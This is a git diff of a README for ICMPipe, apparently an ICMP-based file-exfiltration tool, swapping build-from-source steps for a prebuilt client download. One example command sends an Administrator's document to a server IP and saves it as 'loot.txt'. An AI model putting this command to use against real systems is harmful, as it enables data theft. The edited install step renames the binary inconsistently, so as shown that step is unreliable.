@@ -71,33 +71,22 @@ sudo apt install golang -y
 apt install libpcap-dev
 ```
 
-- Download **icmpipe_client.go** from this repo:
+- Download **ICMPipe_Client** from this repo:
 
 ```bash
-wget https://raw.githubusercontent.com/almontasercloud-collab/ICMPipe/main/client/icmpipe_client.go
+wget https://raw.githubusercontent.com/almontasercloud-collab/ICMPipe/main/client/ICMPipe-Client
 ```
 
-- navigate to directory containing **icmpipe_client.go** file and Initialize Go:
+- Or clone the full repository if you want to modify the source code and rebuild ICMPipe server: **(Optional)**
 
 ```bash
-go mod init icmpipe_client.go
-```
-- download and configure the required Go dependencies:
-
-```bash
-go mod tidy
-```
-
-- Build ICMPipe client:
-
-```bash
-go build -o ICMPipe icmpope_client.go
+git clone https://github.com/almontasercloud-collab/ICMPipe.git
 ```
 
 - Install ICMPipe globally and set execution permissions: **(Optinal)**
 
 ```bash
-sudo mv ./ICMPipe /usr/local/bin && sudo chmod 755 /usr/local/bin/ICMPipe
+sudo mv ./ICMPipe-Client /usr/local/bin && sudo chmod 755 /usr/local/bin/ICMPipe
 ```
 - Display command usage:
 
@@ -107,7 +96,7 @@ sudo ICMPipe
 - (Example) Select the file, interface, server IP and output path:
 
 ```bash
-sudo ICMPipe -p "C:\Users\Administrator\Documents\test.txt" -i eth0 -ip 172.16.2.10 -O ./loot.txt
+sudo ICMPipe-Client -p "C:\Users\Administrator\Documents\test.txt" -i eth0 -ip 172.16.2.10 -O ./loot.txt
 ```
 ### 3- Result: 
 
